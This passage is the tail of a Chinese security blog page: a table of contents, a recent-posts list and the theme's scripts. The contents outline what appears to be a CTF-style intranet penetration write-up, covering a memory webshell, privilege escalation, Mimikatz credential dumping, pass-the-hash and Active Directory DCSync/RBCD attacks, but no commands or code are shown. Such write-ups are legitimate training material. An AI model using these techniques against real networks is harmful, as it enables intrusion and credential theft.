toc-level-4"><a class="toc-link" href="#%E4%B8%8D%E5%87%BA%E7%BD%91%E6%89%93%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.1.1.2.</span> <span class="toc-text">不出网打内存马</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">1.2.</span> <span class="toc-text">内网渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#flag02"><span class="toc-number">1.2.1.</span> <span class="toc-text">flag02</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#jar%E5%8F%8D%E7%BC%96%E8%AF%91"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">jar反编译</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SeImpersonatePrivilege"><span class="toc-number">1.2.1.2.</span> <span class="toc-text">SeImpersonatePrivilege</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag03"><span class="toc-number">1.2.2.</span> <span class="toc-text">flag03</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#SharpHound%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">SharpHound信息收集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96-Procdump-Mimikatz%EF%BC%88%E6%B2%A1%E6%88%90%E5%8A%9F%EF%BC%89"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">远程密码获取-Procdump+Mimikatz（没成功）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#autologin%E7%9A%84%E9%85%8D%E7%BD%AE"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">autologin的配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SeBackupPrivilege-%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%8F%90%E6%9D%83"><span class="toc-number">1.2.2.4.</span> <span class="toc-text">SeBackupPrivilege-注册表提权</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PTH"><span class="toc-number">1.2.2.5.</span> <span class="toc-text">PTH</span></a></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">1.2.2.6.</span> <span class="toc-text"></span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flag04"><span class="toc-number">1.2.3.</span> <span class="toc-text">flag04</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#wirteDACL-DCSync-%E6%B2%A1%E6%88%90%E5%8A%9F"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">wirteDACL+DCSync(没成功)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#writeDACL-RBCD"><span class="toc-number">1.2.3.2.</span> <span class="toc-text">writeDACL+RBCD</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.3.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/b6e82410.html" title="5、并发编程">5、并发编程</a><time datetime="2025-08-07T13:57:12.000Z" title="发表于 2025-08-07 21:57:12">2025-08-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/5715da98.html" title="4、函数&amp;字符串格式化&amp;条件控制&amp;结构体">4、函数&amp;字符串格式化&amp;条件控制&amp;结构体</a><time datetime="2025-08-07T13:57:10.000Z" title="发表于 2025-08-07 21:57:10">2025-08-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/8b3c7b5f.html" title="3、数组与切片、指针、类型转换、字符串常用函数">3、数组与切片、指针、类型转换、字符串常用函数</a><time datetime="2025-08-07T13:57:09.000Z" title="发表于 2025-08-07 21:57:09">2025-08-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/3beb5b8d.html" title="2、初始函数与基本类型">2、初始函数与基本类型</a><time datetime="2025-08-07T13:57:08.000Z" title="发表于 2025-08-07 21:57:08">2025-08-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/post/347fb1ae.html" title="1、环境配置和编辑器使用">1、环境配置和编辑器使用</a><time datetime="2025-08-07T13:57:07.000Z" title="发表于 2025-08-07 21:57:07">2025-08-07</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;2020 - 2025 By Hundredsu</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.3.4"></script><script src="/js/main.js?v=5.3.4"></script><div class="js-pjax"><script>(() => {
  const runMermaid = ele => {
    window.loadMermaid = true
    const theme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'dark' : 'default'

    ele.forEach((item, index) => {
      const mermaidSrc = item.firstElementChild
      const mermaidThemeConfig = `%%{init:{ 'theme':'${theme}'}}%%\n`
      const mermaidID = `mermaid-${index}`
      const mermaidDefinition = mermaidThemeConfig + mermaidSrc.textContent

      const renderFn = mermaid.render(mermaidID, mermaidDefinition)
      const renderMermaid = svg => {
        mermaidSrc.insertAdjacentHTML('afterend', svg)
      }

      // mermaid v9 and v10 compatibility
      typeof renderFn === 'string' ? renderMermaid(renderFn) : renderFn.then(({ svg }) => renderMermaid(svg))
    })
  }

  const codeToMermaid = () => {
    const codeMermaidEle = document.querySelectorAll('pre > code.mermaid')
    if (codeMermaidEle.length === 0) return

    codeMermaidEle.forEach(ele => {
      const preEle = document.createElement('pre')
      preEle.className = 'mermaid-src'
      preEle.hidden = true
      preEle.textContent = ele.textContent
      const newEle = document.createElement('div')
      newEle.className = 'mermaid-wrap'
      newEle.appendChild(preEle)
      ele.parentNode.replaceWith(newEle)
    })
  }

  const loadMermaid = () => {
    if (false) codeToMermaid()
    const $mermaid = document.querySelectorAll('#article-container .mermaid-wrap')
    if ($mermaid.length === 0) return

    const runMermaidFn = () => runMermaid($mermaid)
    btf.addGlobalFn('themeChange', runMermaidFn, 'mermaid')
    window.loadMermaid ? runMermaidFn() : btf.getScript('https://cdn.jsdelivr.net/npm/mermaid@11.4.1/dist/mermaid.min.js').then(runMermaidFn)
  }

  btf.addGlobalFn('encrypt', loadMermaid, 'mermaid')
  window.pjax ? loadMermaid() : document.addEventListener('DOMContentLoaded', loadMermaid)
})()</script></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.4/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = true;
document.body.addEventListener('input', POWERMODE);
</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=5.3.4"></script></div></div></body></html>